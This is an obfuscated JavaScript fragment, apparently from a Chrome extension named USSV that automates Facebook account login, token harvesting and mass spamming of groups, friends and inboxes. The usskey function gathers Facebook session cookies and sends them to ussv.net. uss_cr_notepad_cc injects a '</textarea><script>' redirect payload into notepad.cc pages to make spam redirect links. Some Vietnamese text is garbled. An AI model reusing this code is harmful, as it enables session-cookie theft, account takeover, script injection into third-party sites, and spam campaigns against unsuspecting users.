                dom_logs_ussv(_lJ[f1W.G3v]({
                    "t": f1W.K1I,
                    "id": f1W.M8X,
                    "r": f1W.W1I
                }), f1W.v7r);
                $(f1W.L6I)[f1W.R4r](f1W.Y5a);
                uss[f1W.k7a]();
            });
            $("#btn_ussv_logs_save_token_list")[f1W.L0Q]("click")[f1W.Z6O](function() {
                var W = "k2E",
                    V = "X2E";
                namefile = $(".input_name_file_token_list")[f1W.o07]();
                if (f1W[V](namefile, null) || f1W[W](namefile, "")) {
                    var E = function() {
                        namefile = "USSV_LIST_TOKEN_" + time_now("time_file") + ".txt";
                    };
                    E();
                }
                var O = $("#ussv_log_panel_list_token")[f1W.o07](),
                    Z = new Blob([O], {
                        type: "text/plain;charset=utf-8"
                    });
                saveAs(Z, namefile);
            });
            $("#btn_ussv_logs_save_live_list")[f1W.L0Q]("click")[f1W.Z6O](function() {
                var W = "m2E",
                    V = "s2E";
                namefile = $(".input_name_file_live_list")[f1W.o07]();
                if (f1W[V](namefile, null) || f1W[W](namefile, "")) {
                    var E = function() {
                        namefile = "USSV_LIST_LIVE_" + time_now("time_file") + ".txt";
                    };
                    E();
                }
                var O = $("#ussv_log_panel_list_live")[f1W.o07](),
                    Z = new Blob([O], {
                        type: "text/plain;charset=utf-8"
                    });
                saveAs(Z, namefile);
            });
            $(F0)[f1W.i77](function() {
                var W = "w2E",
                    V = "x2E",
                    E = "l2E",
                    O = "C2E",
                    Z = "ok, .div_ussv_logs_txt.post_fr_ok, .div_ussv_logs_txt.post_gr_ok",
                    F = "g2E",
                    o = "error, .div_ussv_logs_txt.post_fr_error, .div_ussv_logs_txt.post_gr_error",
                    U = "D2E",
                    p = "Y2E",
                    M = "#sl_loc_ussv_logs_change_method";
                $(E0)[f1W.v37]();
                var b = $(this)[f1W.o07](),
                    H = $(M)[f1W.o07]();
                if (f1W[p](H, L)) {
                    if (f1W[U](b, f1W.U2O)) {
                        var b = o;
                    } else if (f1W[F](b, f1W.r37)) {
                        var b = Z;
                    } else {}
                    if (f1W[O](b, c)) {
                        $(E0)[f1W.R4r]();
                    } else {
                        $(J + b)[f1W.R4r]();
                    }
                } else {
                    if (f1W[E](b, c)) {
                        if (f1W[V](b, f1W.U2O)) {
                            var b = o;
                        } else if (f1W[W](b, f1W.r37)) {
                            var b = Z;
                        } else {}
                        $(J + H)[f1W.R4r]();
                    } else {
                        $(J + b + f1W.I2Q + H)[f1W.R4r]();
                    }
                }
            });
            $(P)[f1W.i77](function() {
                var W = "V9E",
                    V = "Q2E",
                    E = "t2E",
                    O = "#sl_loc_ussv_logs_change_type";
                $(E0)[f1W.v37]();
                var Z = $(this)[f1W.o07](),
                    F = $(O)[f1W.o07]();
                if (f1W[E](F, L)) {
                    if (f1W[V](Z, c)) {
                        $(E0)[f1W.R4r]();
                    } else {
                        $(J + Z)[f1W.R4r]();
                    }
                } else {
                    if (f1W[W](Z, c)) {
                        $(J + F)[f1W.R4r]();
                    } else {
                        $(J + Z + f1W.I2Q + F)[f1W.R4r]();
                    }
                }
            });
            $(z)[f1W.i77](function() {
                var W = "O9E",
                    V = $(this)[f1W.o07]();
                if (f1W[W](V, f1W.c8Q)) {
                    $(E0)[f1W.R4r]();
                } else {
                    $(E0)[f1W.v37]();
                    $(J + V)[f1W.R4r]();
                }
            });
            $('#btn_ussv_logs_view_listpost')[f1W.i77](function() {
                var W = "H9E",
                    V = "q9E",
                    E = "b9E",
                    O = "U9E",
                    Z = "Z9E";
                $(".div_ussv_logs_txt.logs_post")[f1W.v37]();
                var F = $(".div_ussv_logs_txt.logs_post").length,
                    o = $(this)[f1W.o07]();
                if (f1W[Z](o, "hide_post_logs")) {
                    $("#uss_logs_spam_hidde")[f1W.m8y]("1");
                } else {
                    $("#uss_logs_spam_hidde")[f1W.m8y]("0");
                }
                if (f1W[O](o, "hide_post_logs")) {
                    $(".div_ussv_logs_txt.logs_post")[f1W.v37]();
                    $("#ussv_logs_total_row_post")[f1W.Q0I](F);
                } else if (f1W[E](o, "show_post_logs")) {
                    $(".div_ussv_logs_txt.logs_post")[f1W.R4r]();
                    $("#ussv_logs_total_row_post")[f1W.Q0I](F);
                } else if (f1W[V](o, "only_friend_logs")) {
                    $(".div_ussv_logs_txt.logs_post.post_fr_ok, .div_ussv_logs_txt.logs_post.post_fr_error")[f1W.R4r]();
                    var U = $(".div_ussv_logs_txt.logs_post.post_fr_ok, .div_ussv_logs_txt.logs_post.post_fr_error").length;
                    $("#ussv_logs_total_row_post")[f1W.Q0I](U + "/" + F);
                } else if (f1W[W](o, "only_group_logs")) {
                    $(".div_ussv_logs_txt.logs_post.post_gr_ok, .div_ussv_logs_txt.logs_post.post_gr_error")[f1W.R4r]();
                    var U = $(".div_ussv_logs_txt.logs_post.post_gr_ok, .div_ussv_logs_txt.logs_post.post_gr_error").length;
                    $("#ussv_logs_total_row_post")[f1W.Q0I](U + "/" + F);
                } else {
                    $(".div_ussv_logs_txt.logs_post")[f1W.v37]();
                }
            });
            $(C)[f1W.Z6O](function() {
                var W = "Câ?p nhâ?t nô?i dung spam tha`nh công...",
                    V = "0|_|_|war|spam",
                    E = "#uss_check_content, #uss_can_spam",
                    O = "f9E";
                if (f1W[O](uss_aut(f1W.d9a), f1W.S9a)) {
                    $(E)[f1W.m8y](f1W.B3Q);
                    $(f1W.s9r)[f1W.m8y](f1W.S9X);
                    $(f1W.v6a)[f1W.m8y](f1W.x1v);
                    dom_logs_ussv(lang_vi_checking_ud_ct_sp, V);
                    uss_setting(f1W.L9a, f1W.S9a);
                    uss_setting(f1W.L9a, f1W.c9a);
                    get_setting_spam(f1W.p8O);
                    $(G)[f1W.R4r]()[f1W.Q0I](W)[f1W.F50](f1W.T7Q);
                } else {
                    dom_logs_ussv(D, f1W.X4X);
                }
            });
            $(".btn_ussv_logs_rsdcom")[f1W.Z6O](function() {
                var E = "R9E",
                    O = function(W) {
                        dem = W;
                    };
                note = $(".ussv_log_panel_rsdcom.note");
                O(0);
                data = uss[f1W.r5Q]({
                    "type": 2,
                    "fb_id": 52525
                });
                if (f1W[E](data[f1W.C3y], 0)) {
                    $(note)[f1W.m8y](data[f1W.F5v]);
                    var Z = setInterval(function() {
                        var W = "h9E",
                            V = function() {
                                dem = dem + 1;
                            };
                        V();
                        data = uss[f1W.r5Q]({
                            "type": 1
                        });
                        if (f1W[W](data[f1W.C3y], "done")) {
                            $(note)[f1W.m8y](data[f1W.F5v]);
                            clearInterval(Z);
                        } else {
                            $(note)[f1W.m8y]("Ðang ch? Reset Dcom (" + dem + ")");
                        }
                    }, 4000);
                } else {
                    $(".ussv_log_panel_rsdcom.note")[f1W.m8y]("Yêu c?u th?t b?i !");
                }
            });
            $(I)[f1W.Z6O](function() {
                var W = "N9E";
                for (var V = f1W.L9a; f1W[W](V, f1W.F30); V++) {
                    uss_cr_denho_link(V);
                };
            });
            $(T)[f1W.i77](function() {
                var Z = "Khu vu?c da`nh cho go´i VIP",
                    F = ".ussv_logs_td_logs",
                    o = ".ussv_log_panel.tt, .ussv_logs_td_tt",
                    U = "S9E",
                    p = "tt",
                    M = "P9E",
                    b = ".ussv_logs_td_tt",
                    H = ".ussv_log_panel.logs, .ussv_logs_td_logs",
                    R = "logs",
                    X = "z9E",
                    f = ".ussv_log_panel";
                $(f)[f1W.v37]();
                var n = $(this)[f1W.o07]();
                if (f1W[X](n, R)) {
                    $(H)[f1W.l6Q](f1W.Y5a);
                    $(b)[f1W.v37]();
                } else if (f1W[M](n, p)) {
                    if (f1W[U](uss_aut(f1W.d9a), f1W.S9a)) {
                        $(o)[f1W.l6Q](f1W.Y5a);
                        $(F)[f1W.v37]();
                        chrome[f1W.d60][f1W.K4r]({
                            method: 'POST',
                            action: 'xhttp',
                            url: 'https://ussv.net/ajax/get_text_spam' + h_t + '.php?type=get_setting_spam&user=' + uss_aut(1) + '&mabimat=' + uss_aut(2),
                            data: "token=" + uss_aut(3)
                        }, function(W) {
                            var V = "content",
                                E = "K9E",
                                O = "L9E";
                            if (f1W[O](W, "ERROR")) {
                                div_thongbao(ussv_lang_vi_cant_get_st_sp);
                            } else {
                                var W = JSON[f1W.i2O](W);
                                if (f1W[E](W[f1W.C3y], 0)) {
                                    $("#ussv_log_panel_tt_img")[f1W.o07](W[f1W.S9y]);
                                    $("#ussv_log_panel_tt_content")[f1W.o07](W[V][f1W.F6r](/%0A/gi, "\n"));
                                } else {}
                            }
                            $(".ussv_log_panel_tt.note")[f1W.R4r]()[f1W.Q0I](W[f1W.F5v])[f1W.F50](3000);
                        });
                    } else {
                        alert(Z);
                        dom_logs_ussv(D, f1W.X4X);
                    }
                } else {}
            });
            $(g)[f1W.i77](function() {
                var W = ".ussv_logs_left_panel.list_live",
                    V = "list_live",
                    E = "o7E",
                    O = ".ussv_logs_left_panel.token_list",
                    Z = "token_list",
                    F = "r7E",
                    o = ".ussv_logs_left_panel.quyen",
                    U = "quyen_list",
                    p = "E7E",
                    M = ".ussv_logs_left_panel.acc",
                    b = "acc_list",
                    H = "W7E",
                    R = "spam_list",
                    X = "d9E";
                $(f1W.m0r)[f1W.v37]();
                var f = $(this)[f1W.o07]();
                if (f1W[X](f, R)) {
                    $(f1W.b8y)[f1W.l6Q](f1W.Y5a);
                } else if (f1W[H](f, b)) {
                    $(M)[f1W.l6Q](f1W.Y5a);
                } else if (f1W[p](f, U)) {
                    $(o)[f1W.l6Q](f1W.Y5a);
                } else if (f1W[F](f, Z)) {
                    $(O)[f1W.l6Q](f1W.Y5a);
                } else if (f1W[E](f, V)) {
                    $(W)[f1W.l6Q](f1W.Y5a);
                } else {}
            });
            $(f1W.h4v)[f1W.Z6O](function() {
                $(this)[f1W.Q0I](img_load);
                ussv_get_fb_acc(f1W.q5X);
            });
            $(N)[f1W.Z6O](function() {
                var W = "Vui lo`ng diê`n ta`i khoa?n hoa?c Mâ?t Khâ?u !",
                    V = "e7E",
                    E = "p7E",
                    O = ".input_pass_custom_acc",
                    Z = ".input_email_custom_acc",
                    F = $(Z)[f1W.o07](),
                    o = $(O)[f1W.o07]();
                if (f1W[E](F, f1W.V8v) || f1W[V](o, f1W.V8v)) {
                    alert(W);
                } else {
                    dom_logs_ussv(f1W.L2Y + F, f1W.d07);
                    div_fast_log(f1W.L9a, F, o);
                }
            });
            $(f1W.e3r)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                $(f1W.z0Y)[f1W.l6Q](f1W.Y5a);
            });
        };
    }

    function find_id_msg(W) {
        var V = "=2",
            E = "mid=1",
            O = "F1t",
            Z = "B1t";
        if (f1W[Z](W, undefined)) {
            F = W[f1W.x3y](/mid=(.*?)">/gi);
        }
        if (f1W[O](F, f1W.x0r)) {
            var F = f1W.L9a;
        } else {
            var F = F[f1W.L9a][f1W.F6r](E, f1W.V8v),
                F = F[f1W.F6r](V, f1W.V8Y),
                F = F[f1W.X3Q](f1W.I2Q),
                F = F[f1W.L9a];
        }
        return F;
    }

    function random_str2() {
        var W = "U8",
            V = "Z8",
            E = f1W.V8v,
            O = f1W.h8Q;
        for (var Z = f1W.L9a; f1W[V](Z, f1W.W7a); Z++) E += O[f1W.s40](Math[f1W.n40](f1W[W](Math[f1W.f2I](), O.length)));
        return E;
    }

    function hide_show_menu_setting() {
        var W = ".popup_menu_list.setting.crUrlLogin, .popup_menu_list.setting.updateinfo, .popup_menu_list.setting.stFbTools",
            V = "i9t";
        if (f1W[V](document[f1W.C4y](f1W.n10), f1W.x0r)) {
            $(f1W.I9Y)[f1W.R4r]();
            $(W)[f1W.v37]();
        } else {
            $(f1W.I9Y)[f1W.v37]();
            $(W)[f1W.R4r]();
        }
    }

    function open_div_uss(E, O) {
        uss[f1W.U8Y]({
            "Id": "PanelCheck",
            "Type": "PanelCheck"
        }, function(V) {
            $("#imageLoad")[f1W.v37]();
            thaotac_div_uss(V);
            chrome[f1W.v1O][f1W.z50][f1W.G47](["ussv_username", "ussv_mabimat"], function(W) {
                $("input[name$='user']")[f1W.o07](W[f1W.r4Y]);
                $("input[name$='mabimat']")[f1W.o07](W[f1W.v7v]);
            });
        });
    }

    function uss_cr_notepad_cc(O, Z, F, o) {
        var U = '";var UL_D = atob(UL_E);window.location.href = UL_D;</script>',
            p = '</textarea><script type="text/javascript"> var UL_E = "',
            M = btoa(o),
            b = atob(M),
            H = p + M + U;
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://notepad.cc',
            data: "hi=hi"
        }, function(W) {
            var V = "n7E",
                E = W[f1W.x3y](/var pad_name = '(.*?)';/i);
            if (f1W[V](E, null)) {
                $("#uss_notepad_cc_rd")[f1W.m8y]("0");
                $("#uss_notepad_cc_rd_ok")[f1W.m8y]("1");
                dom_logs_ussv(lang_vi_cr_ntp_error + " " + o, O + "|_|_|error|spam");
            } else {
                dom_logs_ussv("Ta?o link tha`nh công trên Notepad.cc, tiê´n ha`nh thay dô?i Nô?i Dung.<br/>Link Ma?c Ði?nh: " + o + "<br/>Link mo´i: http://notepad.cc/" + E[1], O + "|_|_|ok|spam");
                uss_cr_new_link(E[1], H, O, Z, F);
            }
        });
    }

    function get_friends(Z, F, o, U) {
        var p = f1W.c8r + U;
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: p,
            data: "hj=hj"
        }, function(V) {
            var E = function(W) {
                    acc_doing[f1W.w97] = W.data.length;
                },
                O = JSON[f1W.i2O](V);
            E(O);
            add_friend(Z, F, o, O);
        });
    }

    function gl() {
        var R = "urls";
        this.data = "";
        this[f1W.j2X] = function(W) {
            return chrome[f1W.w7y][f1W.x4X](W);
        };
        this[R] = function(W) {
            var V = "|u|",
                W = W[f1W.F6r](V, f1W.x5O),
                W = W[f1W.F6r](/\|/g, f1W.O9Q);
            return f1W.Q27 + h_sv + f1W.O9Q + W;
        };
        this[f1W.Y5v] = function(W, V) {
            var E = "W16",
                O = "d46",
                Z = "K46",
                F = "L46",
                o = "S46",
                U = "P46",
                p = "z46",
                M = "N46",
                b = "h46",
                H = "R46";
            if (f1W[H](V, undefined)) {
                V = W;
            } else {}
            if (f1W[b](W, 0)) {
                if (f1W[M](V[f1W.x3y]("|dtxt|"), null)) {
                    V = V[f1W.X3Q]("|d")[0];
                    data = this[f1W.j2X]("data/" + V + ".text");
                }
            } else if (f1W[p](W, 3)) {
                data = V;
            } else {
                if (f1W[U](V[f1W.x3y](".gif"), null)) {
                    data = this[f1W.j2X]("img/" + V);
                } else if (f1W[o](V[f1W.x3y]("l.html"), null)) {
                    data = this[f1W.j2X]("lang/l.html");
                } else if (f1W[F](V[f1W.x3y]("langjs"), null)) {
                    data = this[f1W.j2X]("lang/lJ.html");
                } else if (f1W[Z](V[f1W.x3y]("panel-post-html"), null)) {
                    data = this[f1W.j2X]("html/panel_post.html");
                } else if (f1W[O](V[f1W.x3y]("hJ-html"), null)) {
                    data = this[f1W.j2X]("html/hJ.html");
                } else if (f1W[E](V[f1W.x3y]("|u"), null)) {
                    data = this[R](V);
                }
            }
            return data;
        };
        this[f1W.f10] = function(W, V) {
            var E = "E16";
            if (f1W[E](V, 1)) {
                var O = "https://graph.facebook.com/" + W;
            } else {
                var O = "https://www.facebook.com/" + W;
            }
            return O;
        };
    }

    function reset_thongke_check() {
        var W = "#thongke_time_end, #thongke_danhgia_check, #thongke_danhgia_spam",
            V = "#thongke_time_start, #thongke_totla_time, #thongke_check_tc, #thongke_acc_live, #thongke_acc_die, #thongke_acc_cp, #thongke_total_spam_groups_tc, #thongke_total_spam_groups_tb, #thongke_total_spam_groups_tt, #thongke_total_spam_friends_tc, #thongke_total_spam_friends_tb, #thongke_total_spam_friends_tt";
        $(V)[f1W.Q0I](f1W.c8Q);
        $(W)[f1W.Q0I](f1W.R1Q);
    }

    function Load_Login(n, Y) {
        var N = "LoginData";
        if (!Y) {
            var Y = function() {};
        }
        $[f1W.c9y]({
            url: "https://www.facebook.com/login.php?login_attempt=1",
            type: "POST",
            dataType: "json",
            data: n[N]
        })[f1W.D2I](function(F) {
            var o = "c8b",
                U = "J8b",
                p = "I8b",
                M = "T8b",
                b = "a8b",
                H = "i8b";
            if (f1W[H](F[f1W.D60], 4) && f1W[b](F[f1W.p0O], 500)) {
                var R = F[f1W.H8v];
                if (f1W[M](R[f1W.x3y]('checkpoint/'), null)) {
                    var X = 1;
                } else {
                    var X = 0;
                }
                if (f1W[p](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/), null)) {
                    Y({
                        "Error": true,
                        "Note": "Ðang nh?p th?t b?i. Vui lòng ki?m tra l?i tài kho?n !",
                        "Checkpoint": X
                    });
                } else {
                    FB_Uid = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[1])[f1W.s7O]();
                    if (f1W[U](n[f1W.Y9I], 1)) {
                        $("#id_app_duphong")[f1W.o07]("219885578217768");
                        if (f1W[o](R[f1W.x3y]("Redirecting..."), null)) {
                            $[f1W.c9y]({
                                url: "https://facebook.com",
                                type: "GET",
                                dataType: "json"
                            })[f1W.D2I](function(W) {
                                var V = "v8b",
                                    E = "u8b";
                                if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                                    var O = W[f1W.H8v],
                                        Z = _fb[f1W.m5I](O, {
                                            "GetToken": n[f1W.c60]
                                        });
                                    Y({
                                        "Note": "Ðang nh?p thành công...",
                                        "Uid": FB_Uid,
                                        "Aut": Z,
                                        "Checkpoint": X
                                    });
                                } else {}
                            });
                        } else {
                            var f = _fb[f1W.m5I](R, {
                                "GetToken": n[f1W.c60]
                            });
                            Y({
                                "Note": "Ðang nh?p thành công...",
                                "Uid": FB_Uid,
                                "Aut": f,
                                "Checkpoint": X
                            });
                        }
                    } else {
                        var f = {};
                        Y({
                            "Note": "Ðang nh?p thành công...",
                            "Uid": FB_Uid,
                            "Aut": f,
                            "Checkpoint": X
                        });
                    }
                }
            } else {}
        });
    }

    function add_group(E, O, Z, F) {
        var o = "#sp_fb_group_",
            U = "f6b",
            p = "H6b",
            M = "q6b",
            b = function() {
                var W = "&all_group=";
                var V = "&type=updateinfo&value=3&fb_id=";
                datalogin = f1W.o0Y + H + f1W.R87 + R + V + E + f1W.i40 + O + f1W.L9I + Z + W + X;
            },
            H = document[f1W.C4y](f1W.n10)[f1W.V5I],
            R = document[f1W.C4y](f1W.u5X)[f1W.V5I],
            X = F.data.length;
        $(f1W.j4r + E)[f1W.Q0I](X);
        var f = $(f1W.G5Q)[f1W.Q0I]();
        if (f1W[M](f, f1W.B3Q)) {
            var n = $(f1W.i6v)[f1W.Q0I]();
            if (f1W[p](n, f1W.B3Q)) {
                if (f1W[U](Z, f1W.D4X)) {} else {
                    $(o + E)[f1W.Q0I](X);
                }
            }
        } else {}
        var Y = new XMLHttpRequest(),
            N = f1W.l9r;
        b();
        Y[f1W.g4Y] = function() {
            var W = "h6b",
                V = "R6b";
            if (f1W[V](Y[f1W.D60], f1W.d9a) && f1W[W](Y[f1W.p0O], f1W.o9Q)) {};
        };
        Y[f1W.d5y](f1W.k6Q, N, f1W.A0r);
        Y[f1W.x1I](f1W.r27, f1W.W3v);
        Y[f1W.h0r](datalogin);
    }

    function usskey() {
        var X = "unsafe",
            f = "ussft",
            n = "ussfa";
        this[f1W.G47] = function(H, R) {
            chrome[f1W.d60][f1W.K4r]({
                action: 'GetCookie',
                url: 'facebook.com',
                type: 'json',
                name: 'a11y|act|csm|fr|locale|lu|p|presence|s|datr|c_user|xs'
            }, function(U) {
                var p = "fkey",
                    M = U;
                M[f1W.b6y] = 149599458441724;
                if (H[f1W.b6y]) {
                    M[f1W.b6y] = H[f1W.b6y];
                };
                M[p] = _fb[f1W.O00];
                var b = {};
                b[n] = $[f1W.o9Y][f1W.p6O](JSON[f1W.v4X](M));
                acc_doing[f1W.j17][f1W.C8v] = b[n];
                if (H[f1W.M00]) {
                    b[f] = $[f1W.o9Y][f1W.p6O](H[f1W.M00]);
                } else {
                    b[f] = $[f1W.o9Y][f1W.p6O](_fb[f1W.G47]({
                        "app": M[f1W.b6y]
                    }));
                }
                chrome[f1W.v1O][f1W.z50][f1W.G47](["ussv_username", "ussv_mabimat"], function(W) {
                    var V = "user";
                    b[V] = W[f1W.r4Y];
                    var E = $[f1W.o9Y][f1W.p6O](JSON[f1W.v4X](b)),
                        E = encodeURIComponent(uss[f1W.L0X](E)),
                        O = "ussv.net",
                        Z = "ajax/safe.php",
                        F = "String=" + E,
                        o = uss[f1W.G47]('//' + O + '/' + Z + '?' + F);
                    R(o);
                });
            });
        };
        this[X] = function(V, E) {
            $[f1W.c9y]({
                type: "GET",
                url: '//ussv.net/ajax/safe.php?Type=unsafe&String=' + encodeURIComponent(V[f1W.Y5O]),
                dataType: "text",
                success: function(W) {
                    E(W);
                },
                failure: function(W) {}
            });
        };
        this[f1W.D87] = function(O, Z) {
            var F = 'Key không h?p l?.',
                o = 'Key h?p l?.',
                U = "test";
            if (base64Matcher[U](O[X])) {
                O[f1W.a7y] = o;
                var p = $[f1W.o9Y][f1W.x1X](O[X]),
                    p = JSON[f1W.i2O](p),
                    M = $[f1W.o9Y][f1W.x1X](p[n]),
                    b = $[f1W.o9Y][f1W.x1X](p[f]);
                p[n] = JSON[f1W.i2O](M);
                p[f] = b;
                p[f1W.C8v] = $[f1W.o9Y][f1W.p6O](JSON[f1W.v4X](p[n]));;
                $[f1W.r70](f1W.T5Y + p[f], function(W) {
                    var V = 'Key không h?p l?. Nhung dã x?y ra l?i trong quá trình xác minh thông tin tài kho?n.',
                        E = "ussfi";
                    if (W[f1W.W7O]) {
                        p[E] = W;
                        O[f1W.Y5O] = p;
                        Z(O);
                    } else {
                        O[f1W.a7y] = V;
                        O[f1W.m07] = f1W.S9a;
                        Z(O);
                    }
                });
            } else {
                O[f1W.a7y] = F;
                O[f1W.m07] = f1W.S9a;
                Z(O);
            }
        };
    }

    function uss_setting(o, U) {
        var p = "Du~ liê?u không ho?p lê?.",
            M = "z78",
            b = "linkcong",
            H = "wall_message_spam",
            R = "wall_img_spam",
            X = "vip",
            f = "N78";
        if (f1W[f](o, f1W.L9a)) {
            var n = X;
            switch (U) {
                case f1W.S9a:
                    var U = R,
                        Y = $(f1W.y1v)[f1W.o07]();
                    break;
                case f1W.c9a:
                    var U = H,
                        Y = $(f1W.s6Q)[f1W.o07](),
                        Y = Y[f1W.F6r](/\n/g, f1W.o9O),
                        Y = Y[f1W.F6r](/\r/g, f1W.o9O),
                        Y = Y[f1W.F6r](f1W.w3Q, b);
                    break;
                default:
                    var U = f1W.L9a;
            }
            if (f1W[M](U, f1W.L9a)) {
                thongbao_log(f1W.S9a, p);
            } else {
                $[f1W.r70]("//ussv.net/ajax/update_setting_vip.php?method=" + n + "&userid=" + uss_aut(0) + "&utoken=" + uss_aut(3) + "&data=" + Y + "&type=" + U + "&key=nguyenhau", function(W) {
                    var V = "S78",
                        E = "P78",
                        O = "erro";
                    if (W.data) {
                        var Z = W.data[0][f1W.F5v],
                            F = W.data[0][O];
                        if (f1W[E](F, 0)) {} else if (f1W[V](F, 1)) {} else {}
                        thongbao_log(1, Z);
                    }
                });
            }
        } else {}
    }

    function uss_cr_new_link(O, Z, F, o, U, p) {
        var M = Z.length,
            b = f1W.X60 + Z + f1W.S8r + M + f1W.e4Q;
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'uhttp',
            url: 'http://notepad.cc/ajax/update_contents/' + O,
            data: b
        }, function(W) {
            var V = "M7E";
            if (f1W[V](W[f1W.X3Q]("|")[0], 200)) {
                dom_logs_ussv("Thay dô?i nô?i dung tha`nh Công, Link mo´i: http://notepad.cc/" + O, F + "|_|_|ok|spam");
                $("#uss_notepad_cc_rd")[f1W.m8y]("http://notepad.cc/" + O);
                $("#uss_notepad_cc_rd_ok")[f1W.m8y]("1");
                var E = $("#more_info_spam_" + F);
            } else {
                $("#uss_notepad_cc_rd")[f1W.m8y]("0");
                $("#uss_notepad_cc_rd_ok")[f1W.m8y]("1");
                dom_logs_ussv("Thay dô?i nô?i dung thâ´t ba?i, USSV se~ Ðang ba`i vo´i nô?i dung ma?c di?nh : " + p, "0|_|_|error|spam");
            }
        });
    }

    function UParse() {
        this[f1W.I9X] = function(o) {
            chrome[f1W.v1O][f1W.z50][f1W.G47]([f1W.m3r, f1W.c4X, f1W.r4Y, f1W.v7v], function(E) {
                var O = "w1t",
                    Z = "x1t";
                if (f1W.A0r) {};
                if (f1W[Z](E[f1W.m3r], f1W.S9a)) {
                    login(E[f1W.r4Y], E[f1W.v7v]);
                    if (f1W[O](E[f1W.c4X], f1W.S9a)) {
                        var F = setInterval(function() {
                            var W = "lengh",
                                V = "t1t";
                            if (f1W[V]($(f1W.z60)[W], f1W.L9a)) {
                                clearInterval(F);
                                $(f1W.i47)[f1W.v37]();
                                $(f1W.M97)[f1W.R4r]();
                                div_batdaucheck();
                            }
                        }, f1W.Q8r);
                    }
                }
            });
        };
        this[f1W.K1I] = function(f) {
            var n = "uss_st_check_saveusskey",
                Y = "uss_st_Id_Sub",
                N = "uss_st_check_FriendSub",
                g = "uss_st_check_rename",
                T = "uss_st_check_info",
                I = "uss_st_check_fullinfo",
                D = "uss_st_check_page",
                G = "uss_st_check_group",
                C = "uss_st_id_ppa",
                z = "uss_st_check_savecoookie",
                P = "uss_st_check_firstpost",
                J = "uss_st_check_country",
                c = "st_sl_CustomVPN_CP_ChangeIp_BeforeLogin",
                L = "GroupCore_spam_TypeUSS_Data",
                E0 = "GroupCore_spam_TypeUSS_URL",
                F0 = "GroupCore_spam_sl_UseVPN",
                K = "st_sl_CustomJs_Type",
                r0 = "sl_CustomJS",
                Q = "st_CustomJs_Url",
                S = "uss_st_check_type",
                u = "GroupCore_spam_sl_Method_post",
                p0 = "GroupCore_spam_sl_limit_post",
                q0 = "GroupCore_spam_listid_blackgroup",
                H0 = "GroupCore_spam_loc_listgroup",
                W0 = "uss_st_cmt_post_group",
                w = "GroupCore_spam_content",
                B0 = "uss_st_spam_via",
                o0 = "uss_st_spam_inbox_alertcaptcha",
                Z0 = "uss_st_spam_inbox_autocaptcha",
                A = "uss_st_spam_delmsg_inbox",
                X0 = "uss_st_spam_need_fr_inbox_l",
                n0 = "uss_st_spam_need_fr_inbox_f",
                U0 = "uss_st_spam_time_inbox",
                b0 = "uss_st_inbox_link",
                s0 = "uss_st_inbox_title",
                V0 = "uss_st_spam_inbox_via",
                i0 = "uss_st_type_spam_inbox",
                J0 = "uss_st_spam_need_fr",
                f0 = "uss_st_type_spam_wall",
                k0 = "uss_st_type_spam",
                N0 = "uss_st_type_internet_auto_rs_per",
                l0 = "uss_st_type_internet_auto_rs",
                v0 = "uss_st_type_internet",
                K0 = "uss_st_clearbrower",
                P0 = "uss_st_auto_keomem_id",
                Y0 = "uss_st_auto_keomem_limit",
                g0 = "uss_st_auto_keomem_speed",
                u0 = "uss_st_auto_keomem",
                m0 = "uss_st_spam",
                C0 = "uss_st_mp3alert",
                T0 = "uss_st_saipass",
                M0 = "uss_st_checkpoint",
                I0 = "uss_st_autlike",
                G0 = "uss_st_check_str",
                L0 = "V2t",
                B4 = "#uss_st_spam_via",
                Z4 = "Q1t";
            if (f1W[Z4](f[f1W.O4y], f1W.d6X)) {
                var y0 = $(f1W.M40)[f1W.o07](),
                    p4 = $(f1W.J80)[f1W.o07](),
                    x0 = $(f1W.z7O)[f1W.o07](),
                    A0 = $(f1W.f7Y)[f1W.o07](),
                    O0 = $(f1W.I1X)[f1W.o07](),
                    D0 = $(f1W.k4Q)[f1W.o07](),
                    V4 = $(f1W.n67)[f1W.o07](),
                    z0 = $(f1W.e9I)[f1W.o07](),
                    j4 = $(f1W.F7a)[f1W.o07](),
                    S0 = $(f1W.i3X)[f1W.o07](),
                    a0 = $(f1W.Y0y)[f1W.o07](),
                    c0 = $(f1W.R6Q)[f1W.o07](),
                    w0 = $(f1W.w2y)[f1W.o07](),
                    b4 = $(f1W.J2O)[f1W.o07](),
                    q4 = $(f1W.b4I)[f1W.o07](),
                    e4 = $(f1W.X8X)[f1W.o07](),
                    W4 = $(f1W.q9O)[f1W.o07](),
                    r4 = $(f1W.n7a)[f1W.o07](),
                    n4 = $(f1W.c6v)[f1W.o07](),
                    f4 = $(f1W.F6v)[f1W.o07](),
                    E4 = $(f1W.X7y)[f1W.o07](),
                    M4 = $(f1W.G4v)[f1W.o07](),
                    X4 = $(f1W.o27)[f1W.o07](),
                    k4 = $(f1W.c4v)[f1W.o07](),
                    R4 = $(f1W.y0Y)[f1W.o07](),
                    y4 = $(f1W.w2I)[f1W.o07](),
                    s4 = $(f1W.p1y)[f1W.o07](),
                    h4 = $(f1W.j2I)[f1W.o07](),
                    H4 = $(B4)[f1W.o07](),
                    I4 = $(f1W.I5O)[f1W.o07](),
                    e0 = $(f1W.F4Y)[f1W.o07](),
                    t0 = $(f1W.B1v)[f1W.o07](),
                    D4 = $(f1W.o0Q)[f1W.o07](),
                    h0 = $(f1W.o20)[f1W.o07](),
                    R0 = $(f1W.O9v)[f1W.o07](),
                    C4 = $(f1W.A67)[f1W.o07](),
                    z4 = $(f1W.E3r)[f1W.o07](),
                    Y4 = $(f1W.J2I)[f1W.o07](),
                    P4 = $(f1W.F0X)[f1W.o07](),
                    m4 = $(f1W.n2y)[f1W.o07](),
                    J4 = $(f1W.j7v)[f1W.o07](),
                    c4 = $(f1W.F4y)[f1W.o07](),
                    a4 = $(f1W.O8y)[f1W.o07](),
                    d0 = $(f1W.e57)[f1W.o07](),
                    F1 = $(f1W.S0O)[f1W.o07](),
                    E1 = $(f1W.f4Q)[f1W.o07](),
                    x4 = $(f1W.F1Y)[f1W.o07](),
                    S4 = $(f1W.p97)[f1W.o07](),
